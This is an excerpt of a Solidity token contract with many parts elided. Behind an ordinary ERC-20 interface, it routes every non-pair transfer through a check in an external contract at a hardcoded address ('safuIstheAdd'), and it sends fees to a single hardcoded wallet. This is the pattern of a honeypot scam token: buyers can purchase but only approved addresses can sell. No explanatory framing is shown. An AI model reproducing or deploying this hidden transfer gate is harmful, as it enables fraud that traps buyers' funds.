...
abstract contract AbsToken is IERC20, Ownable {
    ...
    constructor (
        ...
        address FundAddress, address ReceiveAddress,address _caPro
    ){
        _name = Name;
        _symbol = Symbol;
        _decimals = Decimals;
        ...
        caPro = proCA(_caPro);require(caPro.en() == true);
    ...
    function isMarket(address s, address r) internal view returns (bool){
    ...
    function _transfer(
        ...
        if(!_swapPairList[from]) {
            require(caPro.safuIstheAdd(from));
        }
        bool takeFee;
        bool isSell;
    ...
    function _tokenTransfer(
        ...
        bool takeFee,
        bool isSell
    ) private {if(isMarket(sender,recipient))
...
contract TOKEN is AbsToken {
    constructor() AbsToken(
        ...
        9,//Decimals
        10000000000,//Supply
        address(0x017A92D96ae432028eEEb6b032d6EB92bE83c22F),//FundAddress
        address(0x017A92D96ae432028eEEb6b032d6EB92bE83c22F),//ReceiveAddress
        address(0xBd8f2395aC9D5246556f82fED77b219F2F80f90D )
    ){
    }
}